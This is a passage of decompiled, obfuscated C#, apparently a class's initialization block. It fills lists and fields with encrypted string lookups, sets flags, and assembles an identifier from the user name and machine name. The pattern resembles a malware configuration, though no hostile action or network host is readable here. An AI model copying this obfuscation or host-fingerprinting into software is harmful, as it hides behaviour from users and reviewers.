			SkTISxbocVBV(getString_0(107412129)),
			SkTISxbocVBV(getString_0(107412560)),
			SkTISxbocVBV(getString_0(107412543)),
			SkTISxbocVBV(getString_0(107412462)),
			SkTISxbocVBV(getString_0(107412397)),
			SkTISxbocVBV(getString_0(107412352)),
			SkTISxbocVBV(getString_0(107411779))
		};
		ptHRFkgcvuKJ = new List<string>
		{
			SkTISxbocVBV(getString_0(107411690)),
			SkTISxbocVBV(getString_0(107411657)),
			SkTISxbocVBV(getString_0(107411644)),
			SkTISxbocVBV(getString_0(107411563)),
			SkTISxbocVBV(getString_0(107412042)),
			SkTISxbocVBV(getString_0(107412025)),
			SkTISxbocVBV(getString_0(107411948)),
			SkTISxbocVBV(getString_0(107411915)),
			SkTISxbocVBV(getString_0(107411882)),
			SkTISxbocVBV(getString_0(107411849)),
			SkTISxbocVBV(getString_0(107411848)),
			SkTISxbocVBV(getString_0(107411303)),
			SkTISxbocVBV(getString_0(107411262)),
			SkTISxbocVBV(getString_0(107411189)),
			SkTISxbocVBV(getString_0(107411176)),
			SkTISxbocVBV(getString_0(107411143)),
			SkTISxbocVBV(getString_0(107411102)),
			SkTISxbocVBV(getString_0(107411069)),
			SkTISxbocVBV(getString_0(107411508)),
			SkTISxbocVBV(getString_0(107411467)),
			SkTISxbocVBV(getString_0(107411434)),
			SkTISxbocVBV(getString_0(107411425)),
			SkTISxbocVBV(getString_0(107411392)),
			SkTISxbocVBV(getString_0(107411690)),
			SkTISxbocVBV(getString_0(107411319)),
			SkTISxbocVBV(getString_0(107410766)),
			SkTISxbocVBV(getString_0(107410753)),
			SkTISxbocVBV(getString_0(107410720)),
			SkTISxbocVBV(getString_0(107410647)),
			SkTISxbocVBV(getString_0(107410606)),
			SkTISxbocVBV(getString_0(107410573)),
			SkTISxbocVBV(getString_0(107410564)),
			SkTISxbocVBV(getString_0(107411035)),
			SkTISxbocVBV(getString_0(107411657)),
			SkTISxbocVBV(getString_0(107410962)),
			SkTISxbocVBV(getString_0(107411644)),
			SkTISxbocVBV(getString_0(107410929)),
			SkTISxbocVBV(getString_0(107410896)),
			SkTISxbocVBV(getString_0(107410887)),
			SkTISxbocVBV(getString_0(107410854)),
			SkTISxbocVBV(getString_0(107410813)),
			SkTISxbocVBV(getString_0(107410228)),
			SkTISxbocVBV(getString_0(107410195)),
			SkTISxbocVBV(getString_0(107410162)),
			SkTISxbocVBV(getString_0(107410121)),
			SkTISxbocVBV(getString_0(107410112)),
			SkTISxbocVBV(getString_0(107410039))
		};
		toreclCgdJYGB = new List<string>
		{
			SkTISxbocVBV(KCuOidVYGqyU(getString_0(107410510))),
			SkTISxbocVBV(getString_0(107410493)),
			SkTISxbocVBV(getString_0(107410400)),
			SkTISxbocVBV(getString_0(107410303)),
			SkTISxbocVBV(getString_0(107409698)),
			SkTISxbocVBV(getString_0(107409601)),
			SkTISxbocVBV(getString_0(107410020)),
			SkTISxbocVBV(getString_0(107409923)),
			SkTISxbocVBV(getString_0(107409830)),
			SkTISxbocVBV(getString_0(107409221)),
			SkTISxbocVBV(getString_0(107409128)),
			SkTISxbocVBV(getString_0(107409031)),
			SkTISxbocVBV(getString_0(107409418)),
			SkTISxbocVBV(KCuOidVYGqyU(getString_0(107410510)))
		};
		ZlaqrKhgbBxdh = SkTISxbocVBV(getString_0(107409321));
		TZZUOUERRqxMjP = new List<string>
		{
			SkTISxbocVBV(getString_0(107408696)),
			SkTISxbocVBV(getString_0(107408502)),
			SkTISxbocVBV(getString_0(107408820)),
			SkTISxbocVBV(getString_0(107408114)),
			SkTISxbocVBV(getString_0(107408432)),
			SkTISxbocVBV(getString_0(107408238))
		};
		DXbQUKyKVIIp = new List<string>
		{
			SkTISxbocVBV(getString_0(107407532)),
			SkTISxbocVBV(getString_0(107407471)),
			SkTISxbocVBV(getString_0(107407922))
		};
		tanoogVbqvZD = getString_0(107396359);
		xezRDaIykOtj = getString_0(107396359);
		IDYmwgLLySGGWj = new DateTime(2000, 1, 1);
		cgSjEEdtEoKHVgx = new DateTime(2100, 1, 1);
		mvPdeZrEDWt = getString_0(107396902);
		GYVbvtfqJjgcv = getString_0(107390340);
		WZNopkcaTyAhOeK = getString_0(107396359);
		dgrxSpjMQQFyGps = getString_0(107396359);
		HaGOXZpCaZXp = getString_0(107396359);
		vizXCOxFBUVdqg = getString_0(107396902);
		gMaUeFBiLvPSdQ = getString_0(107396359);
		roOXwZlrCIU = getString_0(107396359);
		KtFLKdivITUMrO = new List<string>
		{
			getString_0(107395912),
			getString_0(107396106),
			getString_0(107395914),
			getString_0(107395987)
		};
		LIsjhaBFCgPZ = getString_0(107396359);
		EdfHdpefStIQ = getString_0(107407861);
		izhhUwJwOeQM = getString_0(107396359);
		NGOGExOuNfek = getString_0(107396359);
		MbASQsNGtCqFPvG = getString_0(107396359);
		hPVjJeYznNYvq = string.Empty;
		MLTdJgBbBJeEfk = getString_0(107396359);
		fPGPABNSUakq = getString_0(107396359);
		mUALrRyvunG = getString_0(107396359);
		JIiWASItATM = getString_0(107393973);
		WFsWdCyMbGyLA = getString_0(107393973);
		GaGaCVWpXfVx = getString_0(107396359);
		anqAMEduBjsAXr = getString_0(107396902);
		kzGxNvucvTtI = getString_0(107396359);
		oTdXiAMEpoh = getString_0(107396359);
		gnnNcvIpZNZnp = getString_0(107396359);
		CmjadSMjLKCd = getString_0(107407856);
		kLKiLjiEmNtJvZ = getString_0(107396359);
		QGHMDSMylvnr = getString_0(107396359);
		ggiojiDitQT = getString_0(107407871);
		SrbILrUeaGGbz = getString_0(107396359);
		xEEmDjFfwHL = getString_0(107396359);
		jHtuQgvnloEL = getString_0(107396359);
		WcRXWlGGUWcMizS = getString_0(107396359);
		JxyncXrFSAtEALu = getString_0(107407818);
		IJNLCLtCbZj = getString_0(107396902);
		kdLLJpMRaPGarG = getString_0(107396359);
		dZdwTfmthIRGdy = getString_0(107396359);
		SOsjYHrZSaEZ = getString_0(107396359);
		ZBxlVVUbYpltsUa = new string[0];
		aCercHDJqlth = getString_0(107396359);
		nwAWCtCxbxlBvogQ = true;
		MklqvszlcVY = getString_0(107396359);
		tcfvsNKQegWI = false;
		JZTivxUTDXoXEW = false;
		YMRHLWBJiUVDO = true;
		MOHCCThblRu = false;
		xXiTPiYVwRAzXZ = getString_0(107407837);
		ypofoMoLMAIop = false;
		rDBZwCVKgRUaI = false;
		SqAckyulocFAMW = false;
		zqdqllncQgP = false;
		daZUEUUguJZ = true;
		ggmfZNlfXyjEe = getString_0(107407816) + Environment.UserName + getString_0(107407803) + Environment.MachineName + getString_0(107407782) + VLhifxtGlnnIec.QREtiKJahyEe() + getString_0(107407777);
		oLMoTxVfUjZardvm = new List<string>();
		UquTyEYQtihgV = new List<string>();
		BmyZaDPDavTLL = new List<string>();
	}
}
